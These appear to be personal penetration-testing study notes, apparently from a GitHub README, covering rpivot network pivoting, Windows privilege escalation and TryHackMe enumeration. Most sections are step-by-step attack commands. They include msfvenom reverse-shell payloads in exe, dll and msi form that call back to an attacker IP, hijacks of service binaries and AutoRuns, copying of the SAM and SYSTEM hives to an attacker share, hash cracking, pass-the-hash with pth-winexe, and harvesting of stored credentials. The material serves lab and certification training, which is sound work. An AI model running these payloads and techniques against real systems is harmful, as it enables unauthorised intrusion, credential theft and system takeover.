sudo git clone https://github.com/klsecservices/rpivot.git
```

Installing Python2.7
```
sudo apt-get install python2.7
```


We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
```
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```


Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:
```
scp -r rpivot <user>@<IpaddressOfTarget>:/home/<user>/
```

Running client.py from Pivot Target
```
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which for an example is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

Browsing to the Target Webserver using Proxychains
```
proxychains firefox-esr 172.16.5.135:80
```


Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:

Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
 
-------------------------------------------------------------------------------------

## Local Privilige Escalation
in this part we will use different systems for different part of an attack. 

if a command start with # its from a linux/kali machine. 
if a commmand start with > its from a windows machine but mostly from cmd 
and if a command start with PS> its from a powershell in windows
```
# = linux/kali
> = windows/cmd
PS> = windwos poershell
```
#### General Concepts

Our goal in privilege escalation in windows is to gain a shell running as an administrator or the system user. 

priv esc can be simpåle as an kernel exploit or it need alot of reconnaissance on the compromised system. 

in alot of cases priv esc may not simply rely on a single misconfiguration, but may require you to think and combine multiple misconfigurations. 

All priv esc are effectively examples of access control violations.

access control and users permission are intrisically linked.

when focusing on priv esc in windows, understanding how windows handles permissions is very important. 


### understanding permissions in windows

#### user accounts
user accounts are used to login into a win system. 

think of a user account as a collection of settings / preferences bound to unique identity.

the local administrator account is ccreated by default at installation. 

several other default user accounts may exist (e.g. Guest) depending on the version of windows. 

#### service accounts
service accounts are (somewhat obviusly) used to run services in wind.

service accounts cannot be used to sign in into a win system. 

the system account is a default service account which has the highest privilege of any local account in win. 

other default service accounts include "network service" and "local service". 

#### groups
user accounts can belong to multiple groups, and groups can have multiple users.

goups allow for easier access control to resources. 

regular groups (e.g. administrators, users) have a set list of members. 

pseudo groups (e.g. "authenticated users") have a dynamic list of members which changes based on certain interactins. 

#### windows resources
in windwos, there are multiple types of resources (also known as objetcs):
* Files /directories 
* Registry entries
* services 

wheter a user and/or group has permission to perfom a certion action on a resource depends on that resource's access control list (ACL) 


#### ACLs and ACEs
permissions to access a certain resource in windows are controlled by the access controll list (ACL) for that resource.

each ACL is made up tp zero or more access control entries (ACEs)

each ACE defiuned the relationsship between a principal (e.g. a user, group) and a certain access right. 

![image](https://user-images.githubusercontent.com/24814781/183662541-f43e36ae-8b7f-4bdf-9c1a-f928de1ed753.png)

#### spawning administrator shells
there a couple of reliable to spawn a administrator shells in windows. 

a couple of examples will be talked about below. 

### msfvenom
if we can execute commands with admnin privileges, a reverse shell generated by msfvenom works nicely

example:
```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe
```
this reverse shell can be caught using netcat or metasploits own multi/handler

if you want to escalate from and admin user to full SYSTEM privileges, you can use the PsExec tool from windows sysinternals.
```
https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
```
```
> .\PsExec64.exe -accepteula -i -s <path to example your msfvenom shell.exe> 
```

### example:
![image](https://user-images.githubusercontent.com/24814781/183664949-7ed7f211-2329-48dd-923f-329e30ba530a.png)
![image](https://user-images.githubusercontent.com/24814781/183665223-1abb2aa0-74bf-483e-a1da-cdeb01ecac47.png)
![image](https://user-images.githubusercontent.com/24814781/183665269-d9f37d7d-b03b-4322-8979-b535edc7b450.png)

#### RDP 

alternatively, if RDP is available (or we can enable it), we can add our low privilege user to the administrators group and then spawn an administrator command prompt via the GUI
```
> net localgroup administrators <sername> /add
```


### Privilege Escalation Tools
tools allow us to automate the reconnaisance that can identify potential privilege escalations. 

while it is always important to understand what tools are doing, they are invaluable in a time-limited setting, such as an exam. 
  
in this part we will mostly be using winpeas and seatbelt, there also some demo for powerup and sharpup, however you are free to experiment woth other tools and decide wich you like. 

#### PowerUpp and SharpUp

PowerUp & SharpUp are very similar tools that hunt for specific privilege
escalation misconfigurations.

note: they are very limited enumeration tools, they try to find a sub-set of priv esc methods and are usualy very good at it but should not be the only tools you use. 

PowerUp:
```
https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/mast
er/PowerUp/PowerUp.ps1
```

SharpUp: 
```
https://github.com/GhostPack/SharpUp
```

Pre-Compiled SharpUp: 
```
https://github.com/r3motecontrol/Ghostpack-
CompiledBinaries/blob/master/SharpUp.exe
```
  
#### PowerUp
to run PowerUp you first need a powershell session. 
```
> powershell -exec bypass
```
then: 
```
PS> . .\PowerUp.ps1
```
and lastly:
```
Invoke-Allchecks
```
PowerUp also have a number of exploit functions, wich can be used to perform the actuall priv esc but we will in this part be doing it manualy but its a good thing to remember. 

#### SharpUp
we can run SharpUp either from a poaershell session or cmd. 
```
.\SharpUp.exe
```
the output is similar to PowerUp.

#### Seatbelt

Seatbelt is an enumeration tool. It contains a number of enumeration
checks.
It does not actively hunt for privilege escalation misconfigurations, but
provides related information for further investigation.

obs: unlike PowerUp and SharpUp, by default it will output alot of info about the system

Code: 
```
https://github.com/GhostPack/Seatbelt
```

Pre-Compiled: 
```
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
```

execute seatbelt with no options it will print out the help text
  
if you run seatbelt with the flag "all" it will run all enumeration checks
```
.\SeatBelt.exe all
```

---------------------------------------------------------------------------------------------------
  
## basic machine enum tryhackme (windows) 
```
https://tryhackme.com/room/enumerationpe
```  
# basic local machine enumeration


  
### System
One command that can give us detailed information about the system, such as its build number and installed patches, would be systeminfo. In the example below, we can see which hotfixes have been installed.

![image](https://user-images.githubusercontent.com/24814781/187422939-915beccf-29b3-433b-84ec-a3b2c0bc331e.png)

You can check installed updates using wmic qfe get Caption, Description. This information will give you an idea of how quickly systems are being patched and updated.

![image](https://user-images.githubusercontent.com/24814781/187423036-e84e9af9-b62f-4470-b6ca-b08c922b60b4.png)

You can check the installed and started Windows services using net start. Expect to get a long list; the output below has been snipped.

![image](https://user-images.githubusercontent.com/24814781/187423167-f0231e59-38ae-4f77-bc98-2e0c39f65c70.png)

If you are only interested in installed apps, you can issue wmic product get name,version,vendor. If you run this command on the attached virtual machine, you will get something similar to the following output.

![image](https://user-images.githubusercontent.com/24814781/187423264-e28727d2-ce0d-46eb-8636-073846405caf.png)

### Users

To know who you are, you can run whoami; moreover, to know what you are capable of, i.e., your privileges, you can use whoami /priv. An example is shown in the terminal output below.

![image](https://user-images.githubusercontent.com/24814781/187423377-07c34f7e-b227-4608-864b-4c5b2e28f490.png)

Moreover, you can use whoami /groups to know which groups you belong to. The terminal output below shows that this user belongs to the NT AUTHORITY\Local account and member of Administrators group among other groups.


![image](https://user-images.githubusercontent.com/24814781/187423478-4ec076c6-c7e6-4f72-bb01-a45d5542b67d.png)

You can view users by running net user.

![image](https://user-images.githubusercontent.com/24814781/187423592-e79b829d-33ce-40a3-bf35-755c9f51574d.png)

You can discover the available groups using net group if the system is a Windows Domain Controller or net localgroup otherwise, as shown in the terminal below.

![image](https://user-images.githubusercontent.com/24814781/187423688-7e89cd8c-0847-4954-af9c-b56718ddc429.png)

You can list the users that belong to the local administrators’ group using the command net localgroup administrators.

![image](https://user-images.githubusercontent.com/24814781/187423772-6bc3bfa6-b90a-40f8-941d-e279e6e0c650.png)

Use net accounts to see the local settings on a machine; moreover, you can use net accounts /domain if the machine belongs to a domain. This command helps learn about password policy, such as minimum password length, maximum password age, and lockout duration.


### Networking

You can use the ipconfig command to learn about your system network configuration. If you want to know all network-related settings, you can use ipconfig /all. The terminal output below shows the output when using ipconfig. For instance, we could have used ipconfig /all if we wanted to learn the DNS servers.

![image](https://user-images.githubusercontent.com/24814781/187423900-1a34657c-80d0-4f9f-9d92-43f6152c6aa7.png)

On MS Windows, we can use netstat to get various information, such as which ports the system is listening on, which connections are active, and who is using them. In this example, we use the options -a to display all listening ports and active connections. The -b lets us find the binary involved in the connection, while -n is used to avoid resolving IP addresses and port numbers. Finally, -o display the process ID (PID).

In the partial output shown below, we can see that netstat -abno showed that the server is listening on TCP ports 22, 135, 445 and 3389. The processessshd.exe, RpcSs, and TermService are on ports 22, 135, and 3389, respectively. Moreover, we can see two established connections to the SSH server as indicated by the state ESTABLISHED.

![image](https://user-images.githubusercontent.com/24814781/187424208-ab6bbd63-103e-4c95-bbde-005eb15e1fbf.png)

You might think that you can get an identical result by port scanning the target system; however, this is inaccurate for two reasons. A firewall might be blocking the scanning host from reaching specific network ports. Moreover, port scanning a system generates a considerable amount of traffic, unlike netstat, which makes zero noise.

Finally, it is worth mentioning that using arp -a helps you discover other systems on the same LAN that recently communicated with your system. ARP stands for Address Resolution Protocol; arp -a shows the current ARP entries, i.e., the physical addresses of the systems on the same LAN that communicated with your system. An example output is shown below. This indicates that these IP addresses have communicated somehow with our system; the communication can be an attempt to connect or even a simple ping. Note that 10.10.255.255 does not represent a system as it is the subnet broadcast address.
  
![image](https://user-images.githubusercontent.com/24814781/187424350-ec45e0b2-38a9-42b5-ba72-bca022a4b9d4.png)

### DNS
We are all familiar with Domain Name System (DNS) queries where we can look up A, AAAA, CName, and TXT records, among others.
If we can get a “copy” of all the records that a DNS server is responsible for answering, we might discover hosts we didn’t know existed.

One easy way to try DNS zone transfer is via the dig command.

Depending on the DNS server configuration, DNS zone transfer might be restricted. If it is not restricted, it should be achievable using 
```
dig -t AXFR DOMAIN_NAME @DNS_SERVER
```
The -t AXFR indicates that we are requesting a zone transfer, while @ precedes the DNS_SERVER that we want to query regarding the records related to the specified DOMAIN_NAME.


### SMB

Server Message Block (SMB) is a communication protocol that provides shared access to files and printers. We can check shared folders using net share. Here is an example of the output. We can see that C:\Internal Files is shared under the name Internal.

![image](https://user-images.githubusercontent.com/24814781/187435886-2cf6ba25-0b84-4b41-8666-cea49a0e246c.png)


### SNMP

Simple Network Management Protocol (SNMP) was designed to help collect information about different devices on the network. It lets you know about various network events, from a server with a faulty disk to a printer out of ink. Consequently, SNMP can hold a trove of information for the attacker. One simple tool to query servers related to SNMP is snmpcheck. You can find it on the AttackBox at the /opt/snmpcheck/ directory; the syntax is quite simple: /opt/snmpcheck/snmpcheck.rb 10.10.215.169 -c COMMUNITY_STRING.
If you would like to install snmpcheck on your local Linux box, consider the following commands. 

![image](https://user-images.githubusercontent.com/24814781/187435981-6446e39a-c9b5-4810-8989-e6f16d3cc9f8.png)

#### accesschk
AccessChk is an old but still trustworthy tool for checking user access
control rights.
You can use it to check whether a user or group has access to files,
directories, services, and registry keys.
The downside is more recent versions of the program spawn a GUI
“accept EULA” popup window. When using the command line, we have
to use an older version which still has an /accepteula command line
option.


### Kernel Exploits
#### What is a Kernel?
Kernels are the core of any operating system.
Think of it as a layer between application software and the
actual computer hardware.

The kernel has complete control over the operating system.
Exploiting a kernel vulnerability can result in execution as the
SYSTEM user.

#### Finding Kernel Exploits

Finding and using kernel exploits is usually a simple process:

1. Enumerate Windows version / patch level (systeminfo).
2. Find matching exploits (Google, ExploitDB, GitHub).
3. Compile and run.

Beware though, as Kernel exploits can often be unstable and
may be one-shot or cause a system crash.


Tools
Windows Exploit Suggester:
```
https://github.com/bitsadmin/wesng
```

Precompiled Kernel Exploits:
```
https://github.com/SecWiki/windows-kernel-exploits
```
Watson:
```
https://github.com/rasta-mouse/Watson
```

### Privilege Escalation

(Note: These steps are for Windows 7)
1.Extract the output of the systeminfo command:
```
> systeminfo > systeminfo.txt
```
2.Run wesng to find potential exploits:
```
# python wes.py systeminfo.txt -i 'Elevation
of Privilege' --exploits-only | less
```
3.Cross-reference results with compiled exploits:
https://github.com/SecWiki/windows-kernel-exploits

4.Download the compiled exploit for <whatever CVE or exploit it found> but for this demo we use the CVE-2018-8210 and put it onto the Windows VM:
```
https://github.com/SecWiki/windows-
kernel-exploits/blob/master/CVE-2018-8120/x64.exe
```

5.Start a listener on Kali and run the exploit, providing it
with the reverse shell executable, which should run with
SYSTEM privileges:
```
> .\x64.exe C:\PrivEsc\reverse.exe
```

### Service Exploits
### Services

Services are simply programs that run in the
background, accepting input or performing regular
tasks.

If services run with SYSTEM privileges and are
misconfigured, exploiting them may lead to command
execution with SYSTEM privileges as well.

the following commands are usefull when dealing with services.

Service Commands
Query the configuration of a service:
```
> sc.exe qc <name>
```
Query the current status of a service:
```
> sc.exe query <name>
```
Modify a configuration option of a service:
```
> sc.exe config <name> <option>= <value>
```
Start/Stop a service:
```
> net start/stop <name>
```


#### Service Misconfigurations
  
1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Service Executables
5. DLL Hijacking


### Insecure Service Permissions

Each service has an ACL which defines certain service-specific
permissions.

Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG,
SERVICE_QUERY_STATUS).

Some may be useful (e.g. SERVICE_STOP, SERVICE_START).

Some are dangerous (e.g. SERVICE_CHANGE_CONFIG,
SERVICE_ALL_ACCESS)


If our user has permission to change the configuration of a
service which runs with SYSTEM privileges, we can change
the executable the service uses to one of our own.

Potential Rabbit Hole: If you can change a service
configuration but cannot stop/start the service, you may not
be able to escalate privileges!

Privilege Escalation
example:
1.Run winPEAS to check for service misconfigurations:
```
> .\winPEASany.exe quiet servicesinfo
```
2.Note that we can modify the “daclsvc” service.

3.We can confirm this with accesschk.exe:
```
> .\accesschk.exe /accepteula -uwcqv user daclsvc
```
4.Check the current configuration of the service:
```
> sc qc daclsvc
```

5.Check the current status of the service:
```
> sc query daclsvc
```
6.Reconfigure the service to use our reverse shell executable:
```
> sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```
7.Start a listener on Kali, and then start the service to trigger the
exploit:
```
> net start daclsvc
```

#### Unquoted Service Path
Executables in Windows can be run without using their
extension (e.g. “whoami.exe” can be run by just typing
“whoami”).

Some executables take arguments, separated by spaces, e.g.
someprog.exe arg1 arg2 arg3...

This behavior leads to ambiguity when using absolute paths
that are unquoted and contain spaces.


Consider the following unquoted path:
C:\Program Files\Some Dir\SomeProgram.exe

To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be
the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe”

Windows resolves this ambiguity by checking each of the possibilities in turn.

If we can write to a location Windows checks before the actual executable, we
can trick the service into executing it instead.


#### Privilege Escalation

1.Run winPEAS to check for service misconfigurations:
```
> .\winPEASany.exe quiet servicesinfo
```
2.Note that the “unquotedsvc” service has an unquoted path that
also contains spaces:
```
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```
3.Confirm this using sc:
```
> sc qc unquotedsvc
```


4.Use accesschk.exe to check for write permissions:
```
> .\accesschk.exe /accepteula -uwdq C:\
```
```
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
```
```
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```
5.Copy the reverse shell executable and rename it appropriately:
```
> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
6.Start a listener on Kali, and then start the service to trigger the exploit:
```
> net start unquotedsvc
```

#### Weak Registry Permissions

The Windows registry stores entries for each service.
Since registry entries can have ACLs, if the ACL is
misconfigured, it may be possible to modify a service’s
configuration even if we cannot modify the service
directly.

Privilege Escalation

1.Run winPEAS to check for service misconfigurations:
```
> .\winPEASany.exe quiet servicesinfo
```
2.Note that the “regsvc” service has a weak registry entry. We can confirm this with
PowerShell:
```
PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```

3.Alternatively accesschk.exe can be used to confirm:
```
> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

#### Insecure Service Executables

If the original service executable is modifiable by our
user, we can simply replace it with our reverse shell
executable.

Remember to create a backup of the original executable
if you are exploiting this in a real system!

#### Privilege Escalation

1.Run winPEAS to check for service misconfigurations:
```
> .\winPEASany.exe quiet servicesinfo
```
2.Note that the “filepermsvc” service has an executable which appears to be

writable by everyone. We can confirm this with accesschk.exe:
```
> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```
3.Create a backup of the original service executable:
```
> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
```
4.Copy the reverse shell executable to overwrite the service
executable:
```
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```
5.Start a listener on Kali, and then start the service to trigger the
exploit:
```
> net start filepermsvc
```

### DLL Hijacking 
  
Often a service will try to load functionality from a library
called a DLL (dynamic-link library). Whatever functionality the
DLL provides, will be executed with the same privileges as the
service that loaded it.

If a DLL is loaded with an absolute path, it might be possible
to escalate privileges if that DLL is writable by our user.


A more common misconfiguration that can be used to
escalate privileges is if a DLL is missing from the system,
and our user has write access to a directory within the
PATH that Windows searches for DLLs in.

Unfortunately, initial detection of vulnerable services is
difficult, and often the entire process is very manual.

#### Privilege Escalation

1.Use winPEAS to enumerate non-Windows services:
```
> .\winPEASany.exe quiet servicesinfo
```
2.Note that the C:\Temp directory is writable and in the PATH. Start by
enumerating which of these services our user has stop and start access to:
```
> .\accesschk.exe /accepteula -uvqc user dllsvc
```
3.The “dllsvc” service is vulnerable to DLL Hijacking. According to the
winPEAS output, the service runs the dllhijackservice.exe executable. We
can confirm this manually:
```
> sc qc dllsvc
```
4.Run Procmon64.exe with administrator privileges. Press
Ctrl+L to open the Filter menu.

5.Add a new filter on the Process Name matching
dllhijackservice.exe.

6.On the main screen, deselect registry activity and
network activity.

7.Start the service:
```
> net start dllsvc
```
8.Back in Procmon, note that a number of “NAME NOT
FOUND” errors appear, associated with the hijackme.dll file.

9.At some point, Windows tries to find the file in the C:\Temp
directory, which as we found earlier, is writable by our user.

10. On Kali, generate a reverse shell DLL named hijackme.dll:
```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
```
11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a
listener on Kali and then stop/start the service to trigger the exploit:
```
> net stop dllsvc
```
```
> net start dllsvc
```


### Registry exploits

#### AutoRuns
Windows can be configured to run commands at startup,
with elevated privileges.

These “AutoRuns” are configured in the Registry.
If you are able to write to an AutoRun executable, and are
able to restart the system (or wait for it to be restarted) you
may be able to escalate privileges.

  
#### Privilege Escalation

1. Use winPEAS to check for writable AutoRun executables:
```
> .\winPEASany.exe quiet applicationsinfo
```
2. Alternatively, we could manually enumerate the AutoRun executables:
```
> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
and then use accesschk.exe to verify the permissions on each one:
```
> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by
Everyone. Create a backup of the original:
```
> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
```
4. Copy our reverse shell executable to overwrite the AutoRun executable:
```
> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
```
5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on
Windows 10, the exploit appears to run with the privileges of the last logged on user, so log
out of the “user” account and log in as the “admin” account first.

#### AlwaysInstallElevated REG 
MSI files are package files used to install applications.
These files run with the permissions of the user trying to install
them.

Windows allows for these installers to be run with elevated (i.e.
admin) privileges.

If this is the case, we can generate a malicious MSI file which
contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work.
The “AlwaysInstallElevated” value must be set to 1 for both the local
machine:
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
and the current user:
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
If either of these are missing or disabled, the exploit will not work.

#### 1.Use winPEAS to see if both registry values are set:
```
> .\winPEASany.exe quiet windowscreds
```
2.Alternatively, verify the values manually:
```
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

3.Create a new reverse shell with msfvenom, this time using the msi format,
and save it with the .msi extension:
```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
```
4.Copy the reverse.msi across to the Windows VM, start a listener on Kali,
and run the installer to trigger the exploit:
```
> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

### passwords
#### Passwords?

Yes, passwords.

Even administrators re-use their passwords, or leave
their passwords on systems in readable locations.
Windows can be especially vulnerable to this, as several
features of Windows store passwords insecurely.

#### Registry
Plenty of programs store configuration options in the
Windows Registry.

Windows itself sometimes will store passwords in
plaintext in the Registry.

It is always worth searching the Registry for passwords.

#### Searching the Registry for Passwords
The following commands will search the registry for keys and
values that contain “password”
```
> reg query HKLM /f password /t REG_SZ /s
```
```
> reg query HKCU /f password /t REG_SZ /s
```
This usually generates a lot of results, so often it is more
fruitful to look in known locations.

#### Privilege Escalation

1.Use winPEAS to check common password locations:
```
> .\winPEASany.exe quiet filesinfo userinfo
```
(the final checks will take a long time to complete)
2.The results show both AutoLogon credentials and Putty
session credentials for the admin user
(admin/password123).

3.We can verify these manually:
```
> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```
```
> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```
4.On Kali, we can use the winexe command to spawn a shell using these
credentials:
```
# winexe -U 'admin%password123' //192.168.1.22 cmd.exe
```
if your a admin (or have admin creds etc) you can modify the command a bit and add 
```
--system
```
so for an example: 
```
# winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe
```
to spawn a system shell


#### Saved Creds
Windows has a runas command which allows users to run
commands with the privileges of other users.
This usually requires the knowledge of the other user’s
password.

However, Windows also allows users to save their credentials
to the system, and these saved credentials can be used to
bypass this requirement.

#### Privilege Escalation
1.Use winPEAS to check for saved credentials:
```
> .\winPEASany.exe quiet cmd windowscreds
```
2.It appears that saved credentials for the admin user exist.

3.We can verify this manually using the following command:
```
> cmdkey /list
```

4.If the saved credentials aren’t present, run the following script to
refresh the credential: (ops just in this lab/demo)
```
> C:\PrivEsc\savecred.bat
```
5.We can use the saved credential to run any command as the admin
user. Start a listener on Kali and run the reverse shell executable:
```
> runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

### Configuration Files
Some administrators will leave configurations files on
the system with passwords in them.

The Unattend.xml file is an example of this.
It allows for the largely automated setup of Windows
systems.

#### Searching for Configuration Files
Recursively search for files in the current directory with
“pass” in the name, or ending in “.config”:
```
> dir /s *pass* == *.config
```
Recursively search for files in the current directory that
contain the word “password” and also end in either .xml, .ini,
or .txt:
```
> findstr /si password *.xml *.ini *.txt
```

#### Privilege Escalation
1. Use winPEAS to search for common files which may
contain credentials:
```
> .\winPEASany.exe quiet cmd searchfast filesinfo
```
2. The Unattend.xml file was found. View the contents:
```
> type C:\Windows\Panther\Unattend.xml
``` 
3.A password for the admin user was found. The password
is Base64 encoded: cGFzc3dvcmQxMjM=

4.On Kali we can easily decode this:
```
# echo "cGFzc3dvcmQxMjM=" | base64 -d
```
5.Once again we can simply use winexe to spawn a shell as
the admin user.

### SAM
Windows stores password hashes in the Security Account
Manager (SAM).

The hashes are encrypted with a key which can be found in a
file named SYSTEM.

If you have the ability to read the SAM and SYSTEM files, you
can extract the hashes.

#### SAM/SYSTEM Locations
The SAM and SYSTEM files are located in the
C:\Windows\System32\config directory.

The files are locked while Windows is running.

Backups of the files may exist in the C:\Windows\Repair
or C:\Windows\System32\config\RegBack directories.

#### Privilege Escalation
1.Backups of the SAM and SYSTEM files can be found in
C:\Windows\Repair and are readable by our user.

2.Copy the files back to Kali:
```
> copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
```
```
> copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\
```

3.Download the latest version of the creddump suite:
```
# git clone https://github.com/Neohapsis/creddump7.git
```
4.Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
```
# python2 creddump7/pwdump.py SYSTEM SAM
```
5.Crack the admin user hash using hashcat:
```
# hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```

### Passing the Hash
Windows accepts hashes instead of passwords to
authenticate to a number of services.

We can use a modified version of winexe, pth-winexe to
spawn a command prompt using the admin user’s hash.

#### Privilege Escalation
1.Extract the admin hash from the SAM in the previous step.
2.Use the hash with pth-winexe to spawn a command prompt:
```
# pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
```
3.Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
```
# pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
```

### scheduled tasks

### insecure GUI apps

### startup apps

### installed apps

### hot potato

### token impersonation

### port forwarding

### privilege escalation strategy

### getsystem Named Pipes and Token Duplication

### user privileges

### Privilege Escalation Strategy
  
  -------------------------------------------------------------------------------------------------------------------
  
# Privilege Escalation Techniques
### Windows priv esc Tryhackme 1
```
https://tryhackme.com/room/windowsprivesc20
```

## Harvesting Passwords from Usual Spots

#### Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

#### Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a "cmd.exe" prompt:

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
targeting just one user example:
```
type c:\users\SULJOV\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
  
Note: The command above will only work from cmd.exe, as Powershell won't recognize " %userprofile% " as an environment variable. To read the file from Powershell, you'd have to replace " %userprofile% " with " $Env:userprofile ". 

#### Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
```
cmdkey /list
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

```
runas /savecred /user:admin cmd.exe
```

#### IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```


Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.


#### Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Other Quick Wins

Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.

#### Scheduled Tasks

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the "schtasks" command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

example:
```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
```
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like.

